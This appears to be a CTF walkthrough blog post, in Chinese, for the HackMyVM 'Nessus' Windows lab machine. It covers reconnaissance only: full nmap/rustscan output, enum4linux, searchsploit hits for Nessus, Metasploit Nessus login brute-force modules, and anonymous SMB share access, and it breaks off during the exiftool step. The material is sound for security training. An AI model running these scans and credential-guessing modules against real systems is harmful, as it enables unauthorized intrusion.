---
title: HMV-Nessus
description: "Just exploit a well known application without a CVE. Hope you enjoy it."
pubDate: 2026-01-29
image: /machine/Nessus.png
categories:
  - Documentation
tags:
  - Hackmyvm
  - Windows Machine
  - DLL Hijacking
---

![](/image/hmvmachines/Nessus-1.png)

# 信息收集
## IP定位
```
┌──(web)─(root㉿kali)-[/home/kali]
└─# arp-scan -l | grep 08:00:27

WARNING: Cannot open MAC/Vendor file ieee-oui.txt: Permission denied
WARNING: Cannot open MAC/Vendor file mac-vendor.txt: Permission denied
192.168.0.107   08:00:27:ad:9a:f0       (Unknown)
```

## rustscan扫描
```c
┌──(web)─(root㉿kali)-[/home/kali]
└─# rustscan -a 192.168.0.107 -- -A 
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: http://discord.skerritt.blog         :
: https://github.com/RustScan/RustScan :
 --------------------------------------
I scanned my computer so many times, it thinks we're dating.

[~] The config file is expected to be at "/root/.rustscan.toml"
[!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
[!] Your file limit is very small, which negatively impacts RustScan's speed. Use the Docker image, or up the Ulimit with '--ulimit 5000'. 
Open 192.168.0.107:135
Open 192.168.0.107:139
Open 192.168.0.107:445
Open 192.168.0.107:5985
Open 192.168.0.107:8834
Open 192.168.0.107:47001
Open 192.168.0.107:49664
Open 192.168.0.107:49665
Open 192.168.0.107:49666
Open 192.168.0.107:49667
Open 192.168.0.107:49668
Open 192.168.0.107:49671
[~] Starting Script(s)
[>] Running script "nmap -vvv -p {{port}} -{{ipversion}} {{ip}} -A" on ip 192.168.0.107
Depending on the complexity of the script, results may take some time to appear.
[~] Starting Nmap 7.94SVN ( https://nmap.org ) at 2026-01-28 08:26 EST
NSE: Loaded 156 scripts for scanning.
NSE: Script Pre-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 08:26
Completed NSE at 08:26, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 08:26
Completed NSE at 08:26, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 08:26
Completed NSE at 08:26, 0.00s elapsed
Initiating ARP Ping Scan at 08:26
Scanning 192.168.0.107 [1 port]
Completed ARP Ping Scan at 08:26, 0.09s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 08:26
Completed Parallel DNS resolution of 1 host. at 08:26, 0.04s elapsed
DNS resolution of 1 IPs took 0.04s. Mode: Async [#: 3, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]
Initiating SYN Stealth Scan at 08:26
Scanning 192.168.0.107 [12 ports]
Discovered open port 445/tcp on 192.168.0.107
Discovered open port 139/tcp on 192.168.0.107
Discovered open port 135/tcp on 192.168.0.107
Discovered open port 49667/tcp on 192.168.0.107
Discovered open port 49671/tcp on 192.168.0.107
Discovered open port 8834/tcp on 192.168.0.107
Discovered open port 49668/tcp on 192.168.0.107
Discovered open port 5985/tcp on 192.168.0.107
Discovered open port 49665/tcp on 192.168.0.107
Discovered open port 49666/tcp on 192.168.0.107
Discovered open port 49664/tcp on 192.168.0.107
Discovered open port 47001/tcp on 192.168.0.107
Completed SYN Stealth Scan at 08:26, 0.03s elapsed (12 total ports)
Initiating Service scan at 08:26
Scanning 12 services on 192.168.0.107
Service scan Timing: About 50.00% done; ETC: 08:27 (0:00:54 remaining)
Completed Service scan at 08:28, 137.41s elapsed (12 services on 1 host)
Initiating OS detection (try #1) against 192.168.0.107
Retrying OS detection (try #2) against 192.168.0.107
NSE: Script scanning 192.168.0.107.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 08:28
Completed NSE at 08:28, 5.50s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 08:28
Completed NSE at 08:28, 1.34s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 08:28
Completed NSE at 08:28, 0.00s elapsed
Nmap scan report for 192.168.0.107
Host is up, received arp-response (0.00054s latency).
Scanned at 2026-01-28 08:26:08 EST for 147s

PORT      STATE SERVICE            REASON          VERSION
135/tcp   open  msrpc              syn-ack ttl 128 Microsoft Windows RPC
139/tcp   open  netbios-ssn        syn-ack ttl 128 Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds?      syn-ack ttl 128
5985/tcp  open  http               syn-ack ttl 128 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
8834/tcp  open  ssl/nessus-xmlrpc? syn-ack ttl 128
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=WIN-C05BOCC7F0H/organizationName=Nessus Users United/stateOrProvinceName=NY/countryName=US/localityName=New York/organizationalUnitName=Nessus Server
| Issuer: commonName=Nessus Certification Authority/organizationName=Nessus Users United/stateOrProvinceName=NY/countryName=US/localityName=New York/organizationalUnitName=Nessus Certification Authority
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2024-10-18T17:36:17
| Not valid after:  2028-10-17T17:36:17
| MD5:   d62f:ddbd:0931:a519:cc87:4c9a:f7bf:6ff7
| SHA-1: 6bf2:207b:dc38:8181:aee2:03dc:0d3d:fa70:dd77:3af6
| -----BEGIN CERTIFICATE-----
| MIIEEjCCAvqgAwIBAgIDAJV2MA0GCSqGSIb3DQEBCwUAMIGdMRwwGgYDVQQKDBNO
| ZXNzdXMgVXNlcnMgVW5pdGVkMScwJQYDVQQLDB5OZXNzdXMgQ2VydGlmaWNhdGlv
| biBBdXRob3JpdHkxETAPBgNVBAcMCE5ldyBZb3JrMQswCQYDVQQGEwJVUzELMAkG
| A1UECAwCTlkxJzAlBgNVBAMMHk5lc3N1cyBDZXJ0aWZpY2F0aW9uIEF1dGhvcml0
| eTAeFw0yNDEwMTgxNzM2MTdaFw0yODEwMTcxNzM2MTdaMH0xHDAaBgNVBAoME05l
| c3N1cyBVc2VycyBVbml0ZWQxFjAUBgNVBAsMDU5lc3N1cyBTZXJ2ZXIxETAPBgNV
| BAcMCE5ldyBZb3JrMQswCQYDVQQGEwJVUzELMAkGA1UECAwCTlkxGDAWBgNVBAMM
| D1dJTi1DMDVCT0NDN0YwSDCCASIwDQYJKoZIhvcNAQEBBQADggEPADCCAQoCggEB
| ANYkmLB3EVCbKrHOOzIfW5n/7WZBDBmW2lyg0kz185b10UyNDwiY5AgRwfC2WnaC
| oThJ0QVlVb22s6c1XbaWvyITj1K5xKe1D2uIJHl10EqBcfPq2BefeaXtVoh4jqZu
| VfafEpBwFSPC7dAnO4ZMghKBpWfogM3fYmavNdFptNASZqvTN7hskFETb4ARd397
| WC+fXe+AG4MYgrLyJuZCa+qnI4adkADCCTTtU644Pl8OloVnnK8L5S3wNsEzDXQi
| fvDyZKfo2WMh6BjgjN+X+Cxk4GtFsfX7QCiBr9nKakalE0Mq8nPO4Tm30Tm3GFN6
| looCoH+ZYXAfnUfd8KvHDE8CAwEAAaN6MHgwEQYJYIZIAYb4QgEBBAQDAgZAMA4G
| A1UdDwEB/wQEAwIF4DAdBgNVHQ4EFgQU5ZEiC8RiIg/FclNLopO/rxRBC80wHwYD
| VR0jBBgwFoAULRfLGNDUNuA90xpNsUsFyRiuDyQwEwYDVR0lBAwwCgYIKwYBBQUH
| AwEwDQYJKoZIhvcNAQELBQADggEBAAToblD5fSPM3tyk14/IK0cnDiHSuXFGxXhY
| il7tC177Tb+dNN9vRW58pA4tR+8eDeKUfM+MX6LpJPka4seGbeFjVDppwthlAf44
| ih37bwqAT7Kzznx59VMCjgyDqwe/qprQ9z4OOrD0wnkx4KycTLHmnjCj/rhyUN9+
| WYHPmdwjEiBs2kLGBIVX30+jiwwgd8+nsamEYTVIEB0FCtts3On13KGyS8gpypAr
| e7rQDFdkG+O/M9LKBF+xdcc4SCfEGXdKZnv1V8GVElsYxQ+BxpLjzrI/XLSvqqRm
| 9i8HnGnU8AOEa0rzzdUhzWMjpCj4aG861UAOoOQso5RbHLqNTgU=
|_-----END CERTIFICATE-----
| fingerprint-strings: 
|   GetRequest: 
|     HTTP/1.1 200 OK
|     Cache-Control: must-revalidate
|     X-Frame-Options: DENY
|     Content-Type: text/html
|     ETag: 27393d29a7ce578108e0989bb8e5b05c
|     Connection: close
|     X-XSS-Protection: 1; mode=block
|     Server: NessusWWW
|     Date: Thu, 29 Jan 2026 05:26:39 GMT
|     X-Content-Type-Options: nosniff
|     Content-Length: 1217
|     Content-Security-Policy: upgrade-insecure-requests; block-all-mixed-content; form-action 'self'; frame-ancestors 'none'; frame-src https://store.tenable.com; default-src 'self'; connect-src 'self' www.tenable.com; script-src 'self' www.tenable.com; img-src 'self' data:; style-src 'self' www.tenable.com; object-src 'none'; base-uri 'self';
|     Strict-Transport-Security: max-age=31536000
|     Expect-CT: max-age=0
|     <!doctype html>
|     <html lang="en">
|     <head>
|     <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" />
|_    <meta http-equiv="Content-Security-Policy" content="upgrade-inse
47001/tcp open  http               syn-ack ttl 128 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49664/tcp open  msrpc              syn-ack ttl 128 Microsoft Windows RPC
49665/tcp open  msrpc              syn-ack ttl 128 Microsoft Windows RPC
49666/tcp open  msrpc              syn-ack ttl 128 Microsoft Windows RPC
49667/tcp open  msrpc              syn-ack ttl 128 Microsoft Windows RPC
49668/tcp open  msrpc              syn-ack ttl 128 Microsoft Windows RPC
49671/tcp open  msrpc              syn-ack ttl 128 Microsoft Windows RPC
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port8834-TCP:V=7.94SVN%T=SSL%I=7%D=1/28%Time=697A0E91%P=x86_64-pc-linux
SF:-gnu%r(GetRequest,788,"HTTP/1\.1\x20200\x20OK\r\nCache-Control:\x20must
SF:-revalidate\r\nX-Frame-Options:\x20DENY\r\nContent-Type:\x20text/html\r
SF:\nETag:\x2027393d29a7ce578108e0989bb8e5b05c\r\nConnection:\x20close\r\n
SF:X-XSS-Protection:\x201;\x20mode=block\r\nServer:\x20NessusWWW\r\nDate:\
SF:x20Thu,\x2029\x20Jan\x202026\x2005:26:39\x20GMT\r\nX-Content-Type-Optio
SF:ns:\x20nosniff\r\nContent-Length:\x201217\r\nContent-Security-Policy:\x
SF:20upgrade-insecure-requests;\x20block-all-mixed-content;\x20form-action
SF:\x20'self';\x20frame-ancestors\x20'none';\x20frame-src\x20https://store
SF:\.tenable\.com;\x20default-src\x20'self';\x20connect-src\x20'self'\x20w
SF:ww\.tenable\.com;\x20script-src\x20'self'\x20www\.tenable\.com;\x20img-
SF:src\x20'self'\x20data:;\x20style-src\x20'self'\x20www\.tenable\.com;\x2
SF:0object-src\x20'none';\x20base-uri\x20'self';\r\nStrict-Transport-Secur
SF:ity:\x20max-age=31536000\r\nExpect-CT:\x20max-age=0\r\n\r\n<!doctype\x2
SF:0html>\n<html\x20lang=\"en\">\n\x20\x20\x20\x20<head>\n\x20\x20\x20\x20
SF:\x20\x20\x20\x20<meta\x20http-equiv=\"X-UA-Compatible\"\x20content=\"IE
SF:=edge,chrome=1\"\x20/>\n\x20\x20\x20\x20\x20\x20\x20\x20<meta\x20http-e
SF:quiv=\"Content-Security-Policy\"\x20content=\"upgrade-inse");
MAC Address: 08:00:27:AD:9A:F0 (Oracle VirtualBox virtual NIC)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running (JUST GUESSING): Microsoft Windows 10|2016|2022|2012|7|8.1|2019|Longhorn|Vista|2008 (97%)
OS CPE: cpe:/o:microsoft:windows_10:1703 cpe:/o:microsoft:windows_server_2016 cpe:/o:microsoft:windows_server_2012:r2 cpe:/o:microsoft:windows_7:::ultimate cpe:/o:microsoft:windows_8.1 cpe:/o:microsoft:windows cpe:/o:microsoft:windows_vista::sp1 cpe:/o:microsoft:windows_server_2008:r2
OS fingerprint not ideal because: Missing a closed TCP port so results incomplete
Aggressive OS guesses: Microsoft Windows 10 1703 (97%), Microsoft Windows Server 2016 build 10586 - 14393 (97%), Microsoft Windows Server 2016 (96%), Microsoft Windows Server 2022 (94%), Microsoft Windows 10 1507 - 1607 (94%), Microsoft Windows Server 2012 R2 Update 1 (94%), Microsoft Windows 7, Windows Server 2012, or Windows 8.1 Update 1 (94%), Microsoft Windows 10 1511 (94%), Microsoft Windows Server 2012 or Server 2012 R2 (94%), Microsoft Windows Server 2019 (93%)
No exact OS matches for host (test conditions non-ideal).
TCP/IP fingerprint:
SCAN(V=7.94SVN%E=4%D=1/28%OT=135%CT=%CU=43934%PV=Y%DS=1%DC=D%G=N%M=080027%TM=697A0F03%P=x86_64-pc-linux-gnu)
SEQ(SP=106%GCD=1%ISR=108%TI=I%CI=I%II=I%SS=S%TS=A)
OPS(O1=M5B4NW8ST11%O2=M5B4NW8ST11%O3=M5B4NW8NNT11%O4=M5B4NW8ST11%O5=M5B4NW8ST11%O6=M5B4ST11)
WIN(W1=FFFF%W2=FFFF%W3=FFFF%W4=FFFF%W5=FFFF%W6=FFDC)
ECN(R=Y%DF=Y%T=80%W=FFFF%O=M5B4NW8NNS%CC=Y%Q=)
T1(R=Y%DF=Y%T=80%S=O%A=S+%F=AS%RD=0%Q=)
T2(R=Y%DF=Y%T=80%W=0%S=Z%A=S%F=AR%O=%RD=0%Q=)
T3(R=Y%DF=Y%T=80%W=0%S=Z%A=O%F=AR%O=%RD=0%Q=)
T4(R=Y%DF=Y%T=80%W=0%S=A%A=O%F=R%O=%RD=0%Q=)
T5(R=Y%DF=Y%T=80%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)
T6(R=Y%DF=Y%T=80%W=0%S=A%A=O%F=R%O=%RD=0%Q=)
T7(R=Y%DF=Y%T=80%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)
U1(R=Y%DF=N%T=80%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)
IE(R=Y%DFI=N%T=80%CD=Z)

Uptime guess: 0.004 days (since Wed Jan 28 08:23:15 2026)
Network Distance: 1 hop
TCP Sequence Prediction: Difficulty=262 (Good luck!)
IP ID Sequence Generation: Incremental
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| nbstat: NetBIOS name: NESSUS, NetBIOS user: <unknown>, NetBIOS MAC: 08:00:27:ad:9a:f0 (Oracle VirtualBox virtual NIC)
| Names:
|   NESSUS<00>           Flags: <unique><active>
|   NESSUS<20>           Flags: <unique><active>
|   WORKGROUP<00>        Flags: <group><active>
| Statistics:
|   08:00:27:ad:9a:f0:00:00:00:00:00:00:00:00:00:00:00
|   00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00
|_  00:00:00:00:00:00:00:00:00:00:00:00:00:00
| p2p-conficker: 
|   Checking for Conficker.C or higher...
|   Check 1 (port 50829/tcp): CLEAN (Couldn't connect)
|   Check 2 (port 39541/tcp): CLEAN (Couldn't connect)
|   Check 3 (port 64559/udp): CLEAN (Timeout)
|   Check 4 (port 18253/udp): CLEAN (Failed to receive data)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required
|_clock-skew: -1s
| smb2-time: 
|   date: 2026-01-28T13:28:28
|_  start_date: N/A

TRACEROUTE
HOP RTT     ADDRESS
1   0.54 ms 192.168.0.107

NSE: Script Post-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 08:28
Completed NSE at 08:28, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 08:28
Completed NSE at 08:28, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 08:28
Completed NSE at 08:28, 0.00s elapsed
Read data files from: /usr/share/nmap
OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 147.99 seconds
           Raw packets sent: 45 (3.392KB) | Rcvd: 45 (3.216KB)

```

> 135/tcp   open  msrpc              syn-ack ttl 128 Microsoft Windows RPC
>
> 139/tcp   open  netbios-ssn        syn-ack ttl 128 Microsoft Windows netbios-ssn
>
> 445/tcp   open  microsoft-ds?      syn-ack ttl 128   
>
> 5985/tcp  open  http               syn-ack ttl 128 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
>
> 8834/tcp  open  ssl/nessus-xmlrpc? syn-ack ttl 128
>

看到445就想SMB  135就想RPC  5985 winrm(远程管理)

139为 NetBIOS-老 SMB  

8834/tcp open ssl/nessus-xmlrpc   Server: NessusWWW  CN=WIN-C05BOCC7F0H

 ✔️ **这台机正在运行 Nessus 扫描服务**

## enum4linux
```c
┌──(web)─(root㉿kali)-[/home/kali]
└─# enum4linux -a 192.168.0.107
Starting enum4linux v0.9.1 ( http://labs.portcullis.co.uk/application/enum4linux/ ) on Wed Jan 28 08:37:56 2026

 =========================================( Target Information )=========================================       
                                                        
Target ........... 192.168.0.107                        
RID Range ........ 500-550,1000-1050
Username ......... ''
Password ......... ''
Known Usernames .. administrator, guest, krbtgt, domain admins, root, bin, none


 ===========================( Enumerating Workgroup/Domain on 192.168.0.107 )===========================        
                                                        
                                                        
[+] Got domain/workgroup name: WORKGROUP                
                                                        
                                                        
 ===============================( Nbtstat Information for 192.168.0.107 )===============================        
                                                        
Looking up status of 192.168.0.107                      
        NESSUS          <00> -         B <ACTIVE>  Workstation Service
        NESSUS          <20> -         B <ACTIVE>  File Server Service
        WORKGROUP       <00> - <GROUP> B <ACTIVE>  Domain/Workgroup Name

        MAC Address = 08-00-27-AD-9A-F0

 ===================================( Session Check on 192.168.0.107 )===================================       
                                                        
                                                        
[E] Server doesn't allow session using username '', password ''.  Aborting remainder of tests.  
```

## Nessus
[https://192.168.0.107:8834](https://192.168.0.107:8834/)

```c
┌──(web)─(root㉿kali)-[/home/kali]
└─# searchsploit -t nessus
---------------------- ---------------------------------
 Exploit Title        |  Path
---------------------- ---------------------------------
Nessus 2.0.x - LibNAS | multiple/dos/22634.txt
Nessus 8.2.1 - Cross- | multiple/webapps/46315.txt
Nessus Vulnerability  | windows/remote/4230.html
Nessus Vulnerability  | windows/remote/4237.html
Nessus Web UI 2.3.3 - | multiple/webapps/34929.txt
---------------------- ---------------------------------
Shellcodes: No Results

```

不知道是哪个，逐个尝试

```c
┌──(web)─(root㉿kali)-[/home/kali/Desktop/hmv]
└─# searchsploit -p 34929
  Exploit: Nessus Web UI 2.3.3 - Persistent Cross-Site Scripting
      URL: https://www.exploit-db.com/exploits/34929
     Path: /usr/share/exploitdb/exploits/multiple/webapps/34929.txt
    Codes: CVE-2014-7280, OSVDB-112728
 Verified: True
File Type: Python script, ASCII text executable, with very long lines (335)
//这是个xss就算了吧
┌──(web)─(root㉿kali)-[/home/kali/Desktop/hmv]
└─# searchsploit -p 22634
  Exploit: Nessus 2.0.x - LibNASL Arbitrary Code Execution
      URL: https://www.exploit-db.com/exploits/22634
     Path: /usr/share/exploitdb/exploits/multiple/dos/22634.txt
    Codes: CVE-2003-0372, OSVDB-3190
 Verified: True
File Type: ASCII text
//这个太老了不用看
```

每个都看了一遍发现没啥能用的

上msf试试呢？

```c
msf6 > set TARGET 'Windows'
TARGET => Windows
msf6 > search nessus

Matching Modules
================

   #   Name                                           Disclosure Date  Rank       Check  Description
   -   ----                                           ---------------  ----       -----  -----------
   0   exploit/windows/http/altn_webadmin             2003-06-24       average    No     Alt-N WebAdmin USER Buffer Overflow
   1     \_ target: Automatic                         .                .          .      .
   2     \_ target: WebAdmin 2.0.4 Universal          .                .          .      .
   3     \_ target: WebAdmin 2.0.3 Universal          .                .          .      .
   4     \_ target: WebAdmin 2.0.2 Universal          .                .          .      .
   5     \_ target: WebAdmin 2.0.1 Universal          .                .          .      .
   6   exploit/unix/webapp/barracuda_img_exec         2005-09-01       excellent  Yes    Barracuda IMG.PL Remote Command Execution
   7   auxiliary/admin/dns/dyn_dns_update             .                normal     No     DNS Server Dynamic Update Record Injection
   8     \_ action: ADD                               .                .          .      Add a new record. Fail if it already exists.
   9     \_ action: DELETE                            .                .          .      Delete an existing record.
   10    \_ action: UPDATE                            .                .          .      Add or update a record. (default)
   11  exploit/windows/smb/ms10_061_spoolss           2010-09-14       excellent  No     MS10-061 Microsoft Print Spooler Service Impersonation Vulnerability
   12  exploit/windows/http/mailenable_auth_header    2005-04-24       great      Yes    MailEnable Authorization Header Buffer Overflow
   13  exploit/windows/imap/mailenable_status         2005-07-13       great      No     MailEnable IMAPD (1.54) STATUS Request Buffer Overflow
   14    \_ target: MailEnable 1.54 Pro Universal     .                .          .      .
   15    \_ target: Windows XP Pro SP0/SP1 English    .                .          .      .
   16    \_ target: Windows 2000 Pro English ALL      .                .          .      .
   17    \_ target: Windows 2003 Server English       .                .          .      .
   18  exploit/windows/imap/mercury_rename            2004-11-29       average    Yes    Mercury/32 v4.01a IMAP RENAME Buffer Overflow
   19    \_ target: Automatic                         .                .          .      .
   20    \_ target: Windows 2000 SP4 English          .                .          .      .
   21    \_ target: Windows XP Pro SP0 English        .                .          .      .
   22    \_ target: Windows XP Pro SP1 English        .                .          .      .
   23  auxiliary/scanner/nessus/nessus_ntp_login      .                normal     No     Nessus NTP Login Utility
   24  auxiliary/scanner/nessus/nessus_rest_login     .                normal     No     Nessus RPC Interface Login Utility
   25  auxiliary/scanner/nessus/nessus_xmlrpc_login   .                normal     No     Nessus XMLRPC Interface Login Utility
   26  auxiliary/scanner/nessus/nessus_xmlrpc_ping    .                normal     No     Nessus XMLRPC Interface Ping Utility
   27  exploit/multi/misc/teamcity_agent_xmlrpc_exec  2015-04-14       excellent  Yes    TeamCity Agent XML-RPC Command Execution
   28    \_ target: Windows                           .                .          .      .
   29    \_ target: Linux                             .                .          .      .


Interact with a module by name or index. For example info 29, use 29 or use exploit/multi/misc/teamcity_agent_xmlrpc_exec                                               
After interacting with a module you can manually set a TARGET with set TARGET 'Linux'

msf6 auxiliary(scanner/nessus/nessus_xmlrpc_login) > show options 

Module options (auxiliary/scanner/nessus/nessus_xmlrpc_login):

   Name         Current Sett  Required  Description
                ing
   ----         ------------  --------  -----------
   ANONYMOUS_L  false         yes       Attempt to login
   OGIN                                  with a blank us
                                        ername and passw
                                        ord
   BLANK_PASSW  false         no        Try blank passwo
   ORDS                                 rds for all user
                                        s
   BRUTEFORCE_  5             yes       How fast to brut
   SPEED                                eforce, from 0 t
                                        o 5
   DB_ALL_CRED  false         no        Try each user/pa
   S                                    ssword couple st
                                        ored in the curr
                                        ent database
   DB_ALL_PASS  false         no        Add all password
                                        s in the current
                                         database to the
                                         list
   DB_ALL_USER  false         no        Add all users in
   S                                     the current dat
                                        abase to the lis
                                        t
   DB_SKIP_EXI  none          no        Skip existing cr
   STING                                edentials stored
                                         in the current
                                        database (Accept
                                        ed: none, user,
                                        user&realm)
   PASSWORD                   no        A specific passw
                                        ord to authentic
                                        ate with
   PASS_FILE                  no        File containing
                                        passwords, one p
                                        er line
   Proxies                    no        A proxy chain of
                                         format type:hos
                                        t:port[,type:hos
                                        t:port][...]. Su
                                        pported proxies:
                                         socks5, socks5h
                                        , http, sapni, s
                                        ocks4
   RHOSTS                     yes       The target host(
                                        s), see https://
                                        docs.metasploit.
                                        com/docs/using-m
                                        etasploit/basics
                                        /using-metasploi
                                        t.html
   RPORT        8834          yes       The target port
                                        (TCP)
   SSL          true          no        Negotiate SSL/TL
                                        S for outgoing c
                                        onnections
   STOP_ON_SUC  false         yes       Stop guessing wh
   CESS                                 en a credential
                                        works for a host
   THREADS      1             yes       The number of co
                                        ncurrent threads
                                         (max one per ho
                                        st)
   URI          /login        yes       URI for Nessus X
                                        MLRPC login. Def
                                        ault is /login
   USERNAME                   no        A specific usern
                                        ame to authentic
                                        ate as
   USERPASS_FI                no        File containing
   LE                                   users and passwo
                                        rds separated by
                                         space, one pair
                                         per line
   USER_AS_PAS  false         no        Try the username
   S                                     as the password
                                         for all users
   USER_FILE                  no        File containing
                                        usernames, one p
                                        er line
   VERBOSE      true          yes       Whether to print
                                         output for all
                                        attempts
   VHOST                      no        HTTP server virt
                                        ual host


View the full module info with the info, or info -d command.

msf6 auxiliary(scanner/nessus/nessus_xmlrpc_login) > set RHOSTS 192.168.0.107
RHOSTS => 192.168.0.107
msf6 auxiliary(scanner/nessus/nessus_xmlrpc_login) > run
[-] 192.168.0.107:8834 - Authorization not requested
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed

msf6 auxiliary(scanner/nessus/nessus_rest_login) > set RHOSTS 192.168.0.107
RHOSTS => 192.168.0.107
msf6 auxiliary(scanner/nessus/nessus_rest_login) > run
[*] Error: 192.168.0.107: Metasploit::Framework::LoginScanner::Invalid Cred details can't be blank, Cred details can't be blank (Metasploit::Framework::LoginScanner::Nessus)
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed

```

算了不玩了都是scan模块

## wireshark
![](/image/hmvmachines/Nessus-2.png)

## smb枚举
```c
┌──(web)─(root㉿kali)-[/home/kali/Desktop/hmv]
└─# smbclient -L //192.168.0.107 -N


        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        Documents       Disk      
        IPC$            IPC       Remote IPC
Reconnecting with SMB1 for workgroup listing.
do_connect: Connection to 192.168.0.107 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
Unable to connect with SMB1 -- no workgroup available
                                                          
┌──(web)─(root㉿kali)-[/home/kali/Desktop/hmv]
└─# crackmapexec smb 192.168.0.107

SMB         192.168.0.107   445    NESSUS           [*] Windows Server 2022 Build 20348 x64 (name:NESSUS) (domain:Nessus) (signing:False) (SMBv1:False)

```

> ADMIN$     → 远程管理共享（默认）
>
> C$         → 系统盘共享（默认）
>
> Documents  → ⚠️ 非默认共享（人为创建）
>
> IPC$       → 进程通信
>

### `Documents`
+ `ADMIN$` / `C$`  
👉 **几乎 100% 会拒绝匿名访问**
+ `IPC$`  
👉 只能用于会话、RPC，不是文件
+ `**Documents**`  
👉 **这是人为创建的共享**  
👉 **这是目前唯一“值得关注”的点**

## smb访问
```c
┌──(web)─(root㉿kali)-[/home/kali/Desktop/hmv]
└─# smbclient  //192.168.0.107/Documents -N 

Try "help" to get a list of possible commands.
smb: \> dir
  .                                  DR        0  Fri Oct 18 20:42:53 2024
  ..                                  D        0  Sat Oct 19 01:08:23 2024
  desktop.ini                       AHS      402  Sat Jun 15 13:54:33 2024
  My Basic Network Scan_hwhm7q.pdf      A   122006  Fri Oct 18 18:19:59 2024
  My Music                        DHSrn        0  Sat Jun 15 13:54:27 2024
  My Pictures                     DHSrn        0  Sat Jun 15 13:54:27 2024
  My Videos                       DHSrn        0  Sat Jun 15 13:54:27 2024
  Web Application Tests_f6jg9t.pdf      A   136025  Fri Oct 18 18:20:14 2024

                12942591 blocks of size 4096. 10797127 blocks available
```

下载俩个pdf文件

是俩扫描记录  查看了下没啥用![](/image/hmvmachines/Nessus-3.png)

作者在简介里提到了不会使用`CVE漏洞`。

Just exploit a well known application without a CVE. Hope you enjoy it.

尝试看一下这俩`pdf`文件是否存在隐藏信息：

```c
┌──(kali㉿kali)-[~/temp/Nessus]
└─$ exiftool *       
======== desktop.ini
ExifTool Version Number         : 13.10
File Name                       : desktop.ini
Directory                       : .
File Size                       : 402 bytes
File Modification Date/Time     : 2025:06:09 03:48:20-04:00
File Access Date/Time           : 2025:06:09 03:48:46-04:00
File Inode Change Date/Time     : 2025:06:09 03:48:20-04:00
File Permissions                : -rw-r--r--
File Type                       : TXT
File Type Extension             : txt
MIME Type                       : text/plain
MIME Encoding                   : utf-16le
Byte Order Mark                 : Yes
Newlines                        : Windows CRLF
======== My Basic Network Scan_hwhm7q.pdf
ExifTool Version Number         : 13.10
File Name                       : My Basic Network Scan_hwhm7q.pdf
Directory                       : .
File Size                       : 122 kB
File Modification Date/Time     : 2025:06:09 03:48:22-04:00
File Access Date/Time           : 2025:06:09 03:48:22-04:00
File Inode Change Date/Time     : 2025:06:09 03:48:22-04:00
File Permissions                : -rw-r--r--
File Type                       : PDF
File Type Extension             : pdf
MIME Type                       : application/pdf
Linearized                      : No
Page Count                      : 5
Profile CMM Type                : Little CMS
Profile Version                 : 2.3.0
Profile Class                   : Display Device Profile
Color Space Data                : RGB
Profile Connection Space        : XYZ
Profile Date Time               : 2004:08:13 12:18:06
Profile File Signature          : acsp
Primary Platform                : Microsoft Corporation
CMM Flags                       : Not Embedded, Independent
Device Manufacturer             : Little CMS
Device Model                    : 
Device Attributes               : Reflective, Glossy, Positive, Color
Rendering Intent                : Perceptual
Connection Space Illuminant     : 0.9642 1 0.82491
Profile Creator                 : Little CMS
Profile ID                      : 7fb30d688bf82d32a0e748daf3dba95d
Device Mfg Desc                 : lcms generated
Profile Description             : sRGB
Device Model Desc               : sRGB
Media White Point               : 0.95015 1 1.08826
Red Matrix Column               : 0.43585 0.22238 0.01392
Blue Matrix Column              : 0.14302 0.06059 0.71384
Green Matrix Column             : 0.38533 0.71704 0.09714
Red Tone Reproduction Curve     : (Binary data 2060 bytes, use -b option to extract)
Green Tone Reproduction Curve   : (Binary data 2060 bytes, use -b option to extract)
Blue Tone Reproduction Curve    : (Binary data 2060 bytes, use -b option to extract)
Chromaticity Channels           : 3
